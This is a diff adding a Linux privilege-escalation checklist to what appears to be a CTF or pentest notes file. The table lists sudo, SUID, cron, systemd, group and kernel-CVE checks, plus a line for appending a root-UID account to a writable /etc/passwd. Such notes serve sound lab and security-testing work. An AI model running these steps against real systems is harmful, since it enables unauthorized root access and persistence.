@@ -590,6 +590,19 @@ find / -name "*.py" -writable 2>/dev/null  # python library hijack
 find / -name "*.yml" -writable 2>/dev/null # ansible playbook hijack
 ```
 
+Manual checklist (quick-scan form - walk ALL rows; the box's intended path is usually one of them):
+
+| Check | Command | Win = |
+|---|---|---|
+| sudo rights | `sudo -l` (+ `su` with any held cred) | NOPASSWD/GTFObin -> root |
+| SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | GTFOBins; keep `-p` on the spawned shell or the euid silently drops |
+| Writable /etc/passwd | `ls -la /etc/passwd` | append `user:HASH:0:0:root:/root:/bin/bash`, then `su` |
+| Cron jobs + scripts | `cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*` + pspy | writable/relative-path script root runs |
+| systemd timers | `systemctl list-timers --all` + `systemctl cat <svc>` | writable ExecStart script run as root |
+| Groups | `id` | docker/lxd/adm/disk/shadow -> root GTFO |
+| Reused creds | configs, history, DB, `.ssh`, backups | reuse for `su`/SSH/another service |
+| Kernel CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check patch level first |
+
 ## sudo scp -> root (GTFOBins, non-interactive)
 
 `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/scp`. scp's `-S <prog>` option runs `<prog>` as the SSH
